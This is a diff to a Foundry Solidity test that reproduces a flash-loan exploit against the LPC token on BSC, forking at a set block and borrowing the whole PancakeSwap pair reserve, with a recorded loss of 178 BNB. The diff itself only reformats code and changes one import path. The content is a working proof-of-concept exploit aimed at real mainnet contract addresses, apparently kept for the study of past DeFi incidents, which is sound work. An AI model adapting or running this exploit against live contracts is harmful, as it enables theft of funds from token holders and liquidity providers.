@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IPancakePair} from "src/interfaces/IPancakePair.sol";
 // @KeyInfo - Total Lost : 178 BNB (~ 45,715 US$)
@@ -23,7 +23,6 @@ address constant LPC = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;
 address constant pancakePair = 0x2ecD8Ce228D534D8740617673F31b7541f6A0099;
 
 contract Exploit is Test {
-
     function setUp() public {
         vm.createSelectFork("bsc", 19_852_596);
         vm.label(LPC, "LPC");
@@ -31,10 +30,14 @@ contract Exploit is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("LPC balance", IERC20(LPC).balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "LPC balance",
+            IERC20(LPC).balanceOf(address(this)),
+            18
+        );
 
         console.log("Get LPC reserve in PancakeSwap...");
-        (uint256 LPC_reserve,,) = IPancakePair(pancakePair).getReserves();
+        (uint256 LPC_reserve, , ) = IPancakePair(pancakePair).getReserves();
         emit log_named_decimal_uint("\tLPC Reserve", LPC_reserve, 18);
 
         console.log("Flashloan all the LPC reserve...");
@@ -43,11 +46,20 @@ contract Exploit is Test {
         IPancakePair(pancakePair).swap(borrowAmount, 0, address(this), data);
         console.log("Flashloan ended");
 
-        emit log_named_decimal_uint("LPC balance", IERC20(LPC).balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "LPC balance",
+            IERC20(LPC).balanceOf(address(this)),
+            18
+        );
         console.log("\nNext transaction will swap LPC to USDT");
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    function pancakeCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external {
         console.log("\tSuccessfully borrow LPC from PancakeSwap");
         uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));
         emit log_named_decimal_uint("\tFlashloaned LPC", LPC_balance, 18);
@@ -62,5 +74,4 @@ contract Exploit is Test {
         uint256 paybackAmount = (amount0 / 90 / 100) * 10_000; // paybackAmount * 90% = amount0  --> fee = 10%
         IERC20(LPC).transfer(pancakePair, paybackAmount);
     }
-
 }
